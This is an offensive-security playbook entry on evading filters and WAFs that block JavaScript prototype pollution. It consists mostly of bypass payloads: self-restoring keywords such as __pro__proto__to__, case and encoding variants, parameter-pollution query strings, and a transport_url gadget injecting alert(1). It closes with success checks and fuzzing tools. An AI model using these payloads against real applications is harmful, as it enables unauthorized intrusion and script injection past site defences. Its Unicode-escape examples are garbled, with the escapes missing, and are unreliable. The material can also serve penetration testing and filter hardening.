# Prototype Pollution — Bypass Techniques

## When this applies

The application filters obvious pollution attempts (rejects `__proto__` keys, blocks `constructor` strings) but the filter is non-recursive, case-sensitive, or naïve about Unicode / encoding. Or a WAF inspects request bodies for pollution markers and you need to evade it.

## Technique

Five canonical bypass families:
1. **Non-recursive replace** — splice the keyword inside itself so removal restores it.
2. **Case manipulation** — mixed/upper case for case-insensitive parsers.
3. **Unicode escapes** — JSON allows `_` for `_`.
4. **Alternate property access** — `constructor.prototype` instead of `__proto__`.
5. **WAF evasion** — URL encoding, parameter pollution, alternate Content-Type.

## Steps

### Filter Evasion

```javascript
// Non-recursive string replacement
Input:  __pro__proto__to__
Filter: __proto__ → (removed)
Result: __proto__

Input:  constconstructorructor
Filter: constructor → (removed)
Result: constructor

// Case manipulation (if case-insensitive)
__PROTO__
__Proto__
__pRoTo__

// Unicode escaping
__proto\__
__proto__

// Alternate property access
constructor.prototype
Object.getPrototypeOf

// Deep nesting
__pro__pro__proto__to__to__
// After 2 passes: __proto__
```

### Sanitization Bypass Examples

```javascript
// Non-recursive filter bypass
?__pro__proto__to__[test]=value
// After filtering: __proto__[test]=value

// Constructor bypass
?constconstructorructor[protoprototypetype][test]=value
// After filtering: constructor[prototype][test]=value

// Mixed bypass
?__pro__proto__to__[transport_url]=data:,alert(1);
?constconstructorructor[protoprototypetype][gadget]=payload

// Unicode encoding (if applicable)
?__proto\__[test]=value

// Case variation (if case-insensitive)
?__PROTO__[test]=value
?__Proto__[test]=value
```

### WAF Bypass

```javascript
// Obfuscation
?__proto__%5Btest%5D=value  // URL encoded brackets

// Chunked encoding (HTTP/2)
POST /api/endpoint HTTP/2
Transfer-Encoding: chunked

// JSON with different encodings
{"__proto__":{"test":"value"}}

// Alternate content types
Content-Type: application/x-www-form-urlencoded
__proto__[test]=value

// Parameter pollution
?__proto__[test]=safe&__proto__[test]=malicious
// Some parsers use the last value

// Mixed encoding
?__proto__%5B%74est%5D=%76alue
```

## Verifying success

- After bypass, the pollution test (e.g., property reflection or `Object.prototype.<key>`) succeeds where the unmodified payload was rejected.
- WAF logs show the request as "clean" but the application reflects the polluted state.
- Differential test: send original payload (rejected with 403/400) vs bypassed payload (200 + pollution effect).

## Common pitfalls

1. **Bypass works locally but fails on production** — WAF may apply different rule sets per environment.
2. **Filter is recursive after all** — your nested payload survives one pass but is caught on the second loop. Check filter source.
3. **Case manipulation only works for `__proto__` substring matches** — JavaScript's `__proto__` magic key is case-sensitive at the runtime level. `__PROTO__` is just a normal string property and won't pollute. Bypass works only when the *filter* is case-insensitive but the *parser* still recognizes `__proto__` after filter removal.
4. **Unicode escape only valid in JSON strings** — query string parameters typically don't decode `_` to `_`.
5. **Parameter pollution behavior varies** — Express uses the array of all values; PHP uses the last; Spring uses the first. Test which one applies.

## Tools

- **Burp Intruder** — fuzz combinations of obfuscation patterns
- **`ppfuzz` / `ppmap`** — automated fuzzing including bypass payloads
- **WAF identification (`wafw00f`)** — knowing the WAF reveals which evasion category to target
- **Burp Repeater "URL-encode key characters"** — quick toggling of percent-encoding
- **Browser DevTools Console** — manual encoding tests (`encodeURIComponent`, `JSON.stringify`)
